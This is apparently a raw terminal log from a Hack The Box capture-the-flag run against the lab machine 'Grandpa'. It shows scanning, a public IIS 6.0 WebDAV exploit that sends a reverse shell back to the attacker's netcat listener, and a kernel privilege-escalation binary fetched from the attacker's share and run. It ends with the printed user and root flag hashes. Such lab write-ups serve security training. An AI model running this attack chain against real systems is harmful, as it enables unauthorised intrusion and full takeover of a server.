@@ -1,0 +1,374 @@
+nmap -A -T4 -p- -Pn -v 10.10.10.14
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 01:05 UTC
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 01:05
+Completed NSE at 01:05, 0.00s elapsed
+Initiating NSE at 01:05
+Completed NSE at 01:05, 0.00s elapsed
+Initiating NSE at 01:05
+Completed NSE at 01:05, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 01:05
+Completed Parallel DNS resolution of 1 host. at 01:05, 0.00s elapsed
+Initiating SYN Stealth Scan at 01:05
+Scanning 10.10.10.14 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.14
+SYN Stealth Scan Timing: About 11.73% done; ETC: 01:10 (0:03:53 remaining)
+SYN Stealth Scan Timing: About 35.82% done; ETC: 01:08 (0:01:49 remaining)
+SYN Stealth Scan Timing: About 62.46% done; ETC: 01:08 (0:00:55 remaining)
+Completed SYN Stealth Scan at 01:07, 130.43s elapsed (65535 total ports)
+Initiating Service scan at 01:07
+Scanning 1 service on 10.10.10.14
+Completed Service scan at 01:08, 6.29s elapsed (1 service on 1 host)
+Initiating OS detection (try #1) against 10.10.10.14
+Retrying OS detection (try #2) against 10.10.10.14
+Initiating Traceroute at 01:08
+Completed Traceroute at 01:08, 0.15s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 01:08
+Completed Parallel DNS resolution of 2 hosts. at 01:08, 0.00s elapsed
+NSE: Script scanning 10.10.10.14.
+Initiating NSE at 01:08
+Completed NSE at 01:08, 2.71s elapsed
+Initiating NSE at 01:08
+Completed NSE at 01:08, 0.57s elapsed
+Initiating NSE at 01:08
+Completed NSE at 01:08, 0.00s elapsed
+Nmap scan report for 10.10.10.14
+Host is up (0.14s latency).
+Not shown: 65534 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 6.0
+| http-ntlm-info:
+|   Target_Name: GRANPA
+|   NetBIOS_Domain_Name: GRANPA
+|   NetBIOS_Computer_Name: GRANPA
+|   DNS_Domain_Name: granpa
+|   DNS_Computer_Name: granpa
+|_  Product_Version: 5.2.3790
+| http-methods:
+|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
+|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
+| http-webdav-scan:
+|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
+|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
+|   Server Type: Microsoft-IIS/6.0
+|   WebDAV type: Unknown
+|_  Server Date: Sun, 29 May 2022 01:08:07 GMT
+|_http-title: Under Construction
+|_http-server-header: Microsoft-IIS/6.0
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
+OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
+Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows XP SP2 or Windows Server 2003 SP2 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=260 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Grandpa_10.10.10.14# nikto -h 10.10.10.14
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.14
++ Target Hostname:    10.10.10.14
++ Target Port:        80
++ Start Time:         2022-05-29 01:11:25 (GMT0)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/6.0
++ Retrieved microsoftofficewebserver header: 5.0_Pub
++ Retrieved x-powered-by header: ASP.NET
++ The anti-clickjacking X-Frame-Options header is not present.
++ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type.
++ Retrieved x-aspnet-version header: 1.1.4322
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Retrieved dasl header: <DAV:sql>
++ Retrieved dav header: 1, 2
++ Retrieved ms-author-via header: MS-FP/4.0,DAV
++ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
++ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
++ WebDAV enabled (PROPFIND LOCK PROPPATCH MKCOL COPY UNLOCK SEARCH listed as allowed)
++ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://10.10.10.14/
++ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
++ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
++ OSVDB-3233: /_vti_bin/shtml.exe/_vti_rpc: FrontPage may be installed.
++ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
++ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
++ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
++ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
++ /_vti_bin/_vti_adm/admin.exe: FrontPage/Sharepointfile available.
++ /_vti_bin/_vti_aut/author.exe: FrontPage/Sharepointfile available.
++ /_vti_bin/_vti_aut/author.dll: FrontPage/Sharepointfile available.
++ 8051 requests: 0 error(s) and 30 item(s) reported on remote host
++ End Time:           2022-05-29 01:31:05 (GMT0) (1180 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Grandpa_10.10.10.14# dirb http://10.10.10.14
+
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Sun May 29 01:11:52 2022
+URL_BASE: http://10.10.10.14/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://10.10.10.14/ ----
++ http://10.10.10.14/_private (CODE:403|SIZE:1529)
+==> DIRECTORY: http://10.10.10.14/_vti_bin/
++ http://10.10.10.14/_vti_bin/_vti_adm/admin.dll (CODE:200|SIZE:195)
++ http://10.10.10.14/_vti_bin/_vti_aut/author.dll (CODE:200|SIZE:195)
++ http://10.10.10.14/_vti_bin/shtml.dll (CODE:200|SIZE:96)
++ http://10.10.10.14/_vti_cnf (CODE:403|SIZE:1529)
++ http://10.10.10.14/_vti_log (CODE:403|SIZE:1529)
++ http://10.10.10.14/_vti_pvt (CODE:403|SIZE:1529)
++ http://10.10.10.14/_vti_txt (CODE:403|SIZE:1529)
++ http://10.10.10.14/aspnet_client (CODE:403|SIZE:218)
+==> DIRECTORY: http://10.10.10.14/images/
+==> DIRECTORY: http://10.10.10.14/Images/
+
+---- Entering directory: http://10.10.10.14/_vti_bin/ ----
+==> DIRECTORY: http://10.10.10.14/_vti_bin/_vti_aut/
+
+---- Entering directory: http://10.10.10.14/images/ ----
+(!) WARNING: All responses for this directory seem to be CODE = 500.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.14/Images/ ----
+(!) WARNING: All responses for this directory seem to be CODE = 500.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://10.10.10.14/_vti_bin/_vti_aut/ ----
+
+-----------------
+END_TIME: Sun May 29 01:47:45 2022
+DOWNLOADED: 15018 - FOUND: 9
+
+Tried edb 8806, but seems failed to  find writeable folders.
+
+IIS 6.0 + WebDav + Bufferoverflow
+https://www.exploit-db.com/exploits/41738 shows how to call calc.exe
+
+https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Grandpa_10.10.10.14# python exploit.py 10.10.10.14 80 10.10.14.2 1234
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Grandpa_10.10.10.14# nc -nlvp 1234
+Listening on [0.0.0.0] (family 0, port 1234)
+Connection from 10.10.10.14 1031 received!
+Microsoft Windows [Version 5.2.3790]
+(C) Copyright 1985-2003 Microsoft Corp.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+nt authority\network service
+
+C:\Documents and Settings>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAuditPrivilege              Generate security audits                  Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+
+C:\Documents and Settings>systeminfo
+systeminfo
+
+Host Name:                 GRANPA
+OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
+OS Version:                5.2.3790 Service Pack 2 Build 3790
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Uniprocessor Free
+Registered Owner:          HTB
+Registered Organization:   HTB
+Product ID:                69712-296-0024942-44782
+Original Install Date:     4/12/2017, 5:07:40 PM
+System Up Time:            0 Days, 0 Hours, 54 Minutes, 8 Seconds
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
+BIOS Version:              INTEL  - 6040000
+Windows Directory:         C:\WINDOWS
+System Directory:          C:\WINDOWS\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             en-us;English (United States)
+Input Locale:              en-us;English (United States)
+Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
+Total Physical Memory:     1,023 MB
+Available Physical Memory: 766 MB
+Page File: Max Size:       2,470 MB
+Page File: Available:      2,309 MB
+Page File: In Use:         161 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 1 Hotfix(s) Installed.
+                           [01]: Q147222
+Network Card(s):           N/A
+
+root@ubuntu-s-1vcpu-1gb-sfo2-01:~/htb/htb/Grandpa_10.10.10.14# searchsploit Windows 2003 Escalation
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                             |  Path
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Microsoft Windows NT/2000/2003/2008/XP/Vista/7 - 'KiTrap0D' User Mode to Ring Escalation (MS10-015)                                        | windows/local/11199.txt
+Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation                                                                | windows/local/6705.txt
+Microsoft Windows Server 2003 SP2 - Local Privilege Escalation (MS14-070)                                                                  | windows/local/35936.py
+Microsoft Windows Server 2003 SP2 - TCP/IP IOCTL Privilege Escalation (MS14-070)                                                           | windows/local/37755.c
+Microsoft Windows XP SP3 (x86) / 2003 SP2 (x86) - 'NDProxy' Local Privilege Escalation (MS14-002)                                          | windows_x86/local/37732.c
+Microsoft Windows XP/2000/2003 - Desktop Wall Paper System Parameter Privilege Escalation                                                  | windows/local/33012.c
+Microsoft Windows XP/2000/2003 - Keyboard Event Privilege Escalation                                                                       | windows/local/26222.c
+Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (K-plugin) (MS08-066)                                                     | windows/local/6757.txt
+Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080)                                                                | windows/local/18176.py
+Microsoft Windows XP/2003 - RPCSS Service Isolation Privilege Escalation                                                                   | windows/local/32892.txt
+Microsoft Windows XP/Vista/2000/2003 - Double-Free Memory Corruption Privilege Escalation                                                  | windows/local/33593.c
+Microsoft Windows XP/Vista/2000/2003/2008 Kernel - Usermode Callback Privilege Escalation (MS08-025) (1)                                   | windows/dos/31585.c
+Microsoft Windows XP/Vista/2003/2008 - WMI Service Isolation Privilege Escalation                                                          | windows/local/32891.txt
+ViRobot Desktop 5.5 and Server 3.5 < 2008.8.1.1 - Local Privilege Escalation                                                               | windows/local/15764.txt
+Zoho ManageEngine ADManager Plus 6.6 (Build < 6659) - Privilege Escalation                                                                 | windows/local/46707.txt
+------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+Try one by one, finally ms08-066 worked!!
+
+C:\Inetpub>copy \\10.10.14.2\share\ms08066.exe ms08066.exe
+copy \\10.10.14.2\share\ms08066.exe ms08066.exe
+        1 file(s) copied.
+
+C:\Inetpub>ms08066.exe
+ms08066.exe
+
+ MS08-0xx Windows Kernel Ancillary Function Driver Local Privilege Escalation Vulnerability Exploit
+
+         Create by SoBeIt.
+
+Kernel is \WINDOWS\system32\ntkrnlpa.exe
+Kernel base address: 80800000
+Major Version:5 Minor Version:2
+Load Base:410000
+HalDispatchTable Offset:8088e078
+NtQueryIntervalProfile function entry address:8088e07c
+Exploit finished.
+
+C:\Inetpub>whoami
+whoami
+
+C:\Inetpub>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FDCB-B9EF
+
+ Directory of C:\Inetpub
+
+05/29/2022  07:28 AM    <DIR>          .
+05/29/2022  07:28 AM    <DIR>          ..
+04/12/2017  05:16 PM    <DIR>          AdminScripts
+05/29/2022  07:27 AM            45,056 ms08066.exe
+05/29/2022  06:58 AM           112,815 ms11-046.exe
+05/29/2022  07:11 AM         4,417,925 ms11-080.exe
+05/29/2022  07:03 AM            73,315 MS14-002.exe
+05/29/2022  06:04 AM            33,812 MS14-070.exe
+04/12/2017  05:17 PM    <DIR>          wwwroot
+               5 File(s)      4,682,923 bytes
+               4 Dir(s)   1,312,215,040 bytes free
+
+C:\Inetpub>whoami
+whoami
+
+C:\Inetpub>cd \
+cd \
+
+C:\>cd \users
+cd \users
+The system cannot find the path specified.
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FDCB-B9EF
+
+ Directory of C:\
+
+04/12/2017  05:27 PM    <DIR>          ADFS
+04/12/2017  05:04 PM                 0 AUTOEXEC.BAT
+04/12/2017  05:04 PM                 0 CONFIG.SYS
+04/12/2017  05:32 PM    <DIR>          Documents and Settings
+04/12/2017  05:17 PM    <DIR>          FPSE_search
+05/29/2022  07:28 AM    <DIR>          Inetpub
+12/24/2017  08:18 PM    <DIR>          Program Files
+09/16/2021  12:52 PM    <DIR>          WINDOWS
+04/12/2017  05:05 PM    <DIR>          wmpub
+               2 File(s)              0 bytes
+               7 Dir(s)   1,312,215,040 bytes free
+
+C:\>cd "Documents and Settings"
+cd "Documents and Settings"
+
+C:\Documents and Settings>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FDCB-B9EF
+
+ Directory of C:\Documents and Settings
+
+04/12/2017  05:32 PM    <DIR>          .
+04/12/2017  05:32 PM    <DIR>          ..
+04/12/2017  05:12 PM    <DIR>          Administrator
+04/12/2017  05:03 PM    <DIR>          All Users
+04/12/2017  05:32 PM    <DIR>          Harry
+               0 File(s)              0 bytes
+               5 Dir(s)   1,312,210,944 bytes free
+
+C:\Documents and Settings>cd harry
+cd harry
+
+C:\Documents and Settings\Harry>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is FDCB-B9EF
+
+ Directory of C:\Documents and Settings\Harry
+
+04/12/2017  05:32 PM    <DIR>          .
+04/12/2017  05:32 PM    <DIR>          ..
+04/12/2017  05:32 PM    <DIR>          Desktop
+04/12/2017  05:32 PM    <DIR>          Favorites
+04/12/2017  05:32 PM    <DIR>          My Documents
+04/12/2017  04:42 PM    <DIR>          Start Menu
+04/12/2017  04:44 PM                 0 Sti_Trace.log
+               1 File(s)              0 bytes
+               6 Dir(s)   1,312,210,944 bytes free
+
+C:\Documents and Settings\Harry>cd desktop
+cd desktop
+
+C:\Documents and Settings\Harry\Desktop>type user.txt
+type user.txt
+bdff5ec67c3cff017f2bedc146a5d869
+C:\Documents and Settings\Harry\Desktop>type ..\..\Administrator\desktop\root.txt
+type ..\..\Administrator\desktop\root.txt
+9359e905a2c35f861f6a57cecf28bb7b
+
